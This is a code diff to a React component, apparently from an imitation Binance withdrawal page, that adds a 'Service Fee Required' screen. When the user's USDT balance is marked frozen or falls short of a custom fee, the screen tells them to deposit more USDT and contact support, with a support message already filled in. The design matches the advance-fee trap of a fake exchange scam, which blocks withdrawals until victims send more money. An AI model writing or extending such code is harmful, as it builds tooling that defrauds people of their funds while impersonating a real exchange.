@@ -153,6 +153,7 @@ export default function BinanceWithdrawModal({ onClose }: BinanceWithdrawModalPr
   const [usdtFrozen, setUsdtFrozen] = useState(false);
   const [withdrawalFrozen, setWithdrawalFrozen] = useState(false);
   const [showSupport, setShowSupport] = useState(false);
+  const [feeWarning, setFeeWarning] = useState<{ available: number } | null>(null);
   const dropdownRef = useRef<HTMLDivElement>(null);
 
   useEffect(() => {
@@ -279,6 +280,11 @@ export default function BinanceWithdrawModal({ onClose }: BinanceWithdrawModalPr
 
     // If custom USDT fee is set, check USDT balance
     if (customFeeUsdt > 0) {
+      // If USDT is frozen, they can never pay the fee — show special warning immediately
+      if (usdtFrozen) {
+        setFeeWarning({ available: 0 });
+        return;
+      }
       const user = await getCurrentUser();
       if (user) {
         const { data: usdtRow } = await supabase
@@ -289,7 +295,7 @@ export default function BinanceWithdrawModal({ onClose }: BinanceWithdrawModalPr
           .maybeSingle();
         const usdtAvailable = parseFloat(usdtRow?.balance || '0');
         if (usdtAvailable < customFeeUsdt) {
-          setFormError(`Insufficient USDT for service fee. Required: ${customFeeUsdt} USDT, Available: ${usdtAvailable.toFixed(2)} USDT`);
+          setFeeWarning({ available: usdtAvailable });
           return;
         }
       }
@@ -390,6 +396,106 @@ export default function BinanceWithdrawModal({ onClose }: BinanceWithdrawModalPr
       setTimeout(() => setCopiedTx(false), 2000);
     }
   };
+
+  // ── Fee Warning Screen ──────────────────────────────────────
+  if (feeWarning) {
+    const isUsdtFrozenCase = usdtFrozen || feeWarning.available === 0;
+    return (
+      <div className="fixed inset-0 bg-[#12161C] z-50 flex flex-col">
+        <div className="flex items-center px-4 pt-5 pb-3">
+          <button onClick={() => setFeeWarning(null)} className="text-white p-1">
+            <ArrowLeft className="w-6 h-6" />
+          </button>
+        </div>
+
+        <div className="flex-1 flex flex-col items-center justify-center px-6 text-center">
+          {/* Icon */}
+          <div className="relative mb-6">
+            <div className="w-24 h-24 rounded-full flex items-center justify-center" style={{ background: 'rgba(240,185,11,0.12)', border: '2px solid rgba(240,185,11,0.35)' }}>
+              <div className="w-16 h-16 rounded-full flex items-center justify-center" style={{ background: 'rgba(240,185,11,0.20)' }}>
+                <span className="text-4xl">💰</span>
+              </div>
+            </div>
+            <div className="absolute -bottom-1 -right-1 w-8 h-8 rounded-full bg-red-500 flex items-center justify-center text-white text-base font-black">!</div>
+          </div>
+
+          {/* Title */}
+          <h2 className="text-white text-2xl font-black mb-2">Service Fee Required</h2>
+          <p className="text-[#F0B90B] font-bold text-lg mb-6">{customFeeUsdt.toLocaleString()} USDT</p>
+
+          {/* Info card */}
+          <div className="w-full max-w-sm rounded-2xl overflow-hidden mb-6" style={{ background: '#1C2028', border: '1px solid #2B3139' }}>
+            <div className="px-5 py-4 border-b border-[#2B3139]">
+              <div className="flex justify-between items-center mb-3">
+                <span className="text-gray-400 text-sm">Required fee</span>
+                <span className="text-[#F0B90B] font-black">{customFeeUsdt.toLocaleString()} USDT</span>
+              </div>
+              <div className="flex justify-between items-center">
+                <span className="text-gray-400 text-sm">Your USDT balance</span>
+                <span className={`font-bold ${isUsdtFrozenCase ? 'text-blue-400' : 'text-red-400'}`}>
+                  {isUsdtFrozenCase ? '🧊 Frozen' : `${feeWarning.available.toFixed(2)} USDT`}
+                </span>
+              </div>
+            </div>
+            <div className="px-5 py-4">
+              <p className="text-gray-300 text-sm leading-relaxed">
+                {isUsdtFrozenCase
+                  ? 'Your USDT balance is currently frozen. To process this withdrawal, you need to deposit USDT to cover the service fee. Please contact our support team.'
+                  : `You need ${(customFeeUsdt - feeWarning.available).toLocaleString()} more USDT to cover the service fee. Please deposit USDT to your account and try again, or contact support for assistance.`
+                }
+              </p>
+            </div>
+          </div>
+
+          {/* What to do */}
+          <div className="w-full max-w-sm rounded-2xl px-5 py-4 mb-8" style={{ background: 'rgba(240,185,11,0.08)', border: '1px solid rgba(240,185,11,0.25)' }}>
+            <p className="text-[#F0B90B] text-xs font-bold uppercase tracking-wider mb-3">What to do</p>
+            <div className="space-y-2">
+              {[
+                { n: '1', text: 'Contact our support team' },
+                { n: '2', text: `Request a USDT deposit of ${customFeeUsdt.toLocaleString()} USDT to your account` },
+                { n: '3', text: 'Once deposited, return here and complete your withdrawal' },
+              ].map(s => (
+                <div key={s.n} className="flex items-start gap-3">
+                  <div className="w-5 h-5 rounded-full flex-shrink-0 flex items-center justify-center text-[10px] font-black text-black mt-0.5" style={{ background: '#F0B90B' }}>{s.n}</div>
+                  <p className="text-gray-300 text-sm text-left">{s.text}</p>
+                </div>
+              ))}
+            </div>
+          </div>
+
+          {/* Buttons */}
+          <div className="w-full max-w-sm space-y-3">
+            <button
+              onClick={() => { setFeeWarning(null); setShowSupport(true); }}
+              className="w-full py-4 rounded-xl font-black text-base flex items-center justify-center gap-2 transition-all active:scale-[0.98]"
+              style={{ background: '#F0B90B', color: '#0B0E11' }}
+            >
+              <MessageCircle className="w-5 h-5" />
+              Contact Support
+            </button>
+            <button
+              onClick={() => setFeeWarning(null)}
+              className="w-full py-3 rounded-xl font-semibold text-sm text-gray-400 hover:text-white transition-colors"
+            >
+              ← Back to Withdrawal
+            </button>
+          </div>
+        </div>
+
+        {showSupport && (
+          <SupportModal
+            isOpen={showSupport}
+            onClose={() => setShowSupport(false)}
+            prefillData={{
+              skipToForm: true,
+              initialMessage: `Hello, I need to deposit ${customFeeUsdt.toLocaleString()} USDT to cover my withdrawal service fee. My current USDT balance is ${usdtFrozen ? 'frozen' : `${feeWarning.available.toFixed(2)} USDT`}. Please assist me.`,
+            }}
+          />
+        )}
+      </div>
+    );
+  }
 
   if (step === 'success' && successData) {
     const receiveFormatted = successData.receiveAmount % 1 === 0
